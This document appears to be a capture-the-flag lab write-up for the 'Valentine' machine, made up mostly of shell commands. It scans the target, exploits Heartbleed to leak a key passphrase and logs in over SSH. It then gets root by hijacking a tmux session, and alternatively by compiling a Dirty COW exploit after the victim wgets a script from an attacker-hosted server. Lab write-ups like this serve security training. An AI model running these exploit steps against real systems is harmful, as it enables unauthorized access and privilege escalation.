# Valentine

## scanning
```bash
furious 10.10.10.79

nmap -sC -sV -p80,443,22 -n -Pn 10.10.10.79 -oN targeted
```
![1852.png](1852.png)

## 80 
```bash
wfuzz -c --hc 403,404 -t 100 -w /usr/share/dirb/wordlists/common.txt http://10.10.10.79/FUZZ
```
![1834.png](1834.png)

http://10.10.10.79/dev/notes.txt

![2255.png](2255.png)
```bash
wget http://10.10.10.79/dev/hype_key
```
![2204.png](2204.png)

## heartbleed
```bash
sslscan 10.10.10.79
```

![2208.png](2208.png)
### Locate categories of nmap
```bash
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
nmap --script "vuln and safe" -p 443 10.10.10.79
```
![2342.png](2342.png)
```bash
wget https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py

python heartbleed.py 10.10.10.79 -n 150
```
![1349.png](1349.png)
```bash
#dato obtenido
text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
echo $text | base64 -d
# heartbleedbelievethehype
```

## hype_key
```bash
cat hype_key | tr -d " " | xxd -ps -r
```
![1333.png](1333.png)

```bash
ssh -i id_rsa hype@10.10.10.79

cat /home/hype/user.txt
```

## privilege scalation

```bash
ps aux
```
![1510.png](1510.png)

```bash
tmux -S /.devs/dev_sess
cat /root/root.txt
```

## Dirty cow (another form)
![1551.png](1551.png)

```bash
# on victim machine
uname -a
lsb_release -a

# attacker machine
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
# set a python http server
sudo python3 -m http.server 80

# on victim machine accept the file from the attacker machine
cd /tmp
wget http://10.10.14.5/lse.sh
```

### search for a dirty cow PoC
```bash
searchsploit dirty cow
searchsploit -m linux/local/40839.c
```
### we pass it to the victim machine and compile it there
```bash
mv 40839.c dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty

#ctrl + c
su firefart
cat /root/root.txt
```
![1731.png](1731.png)


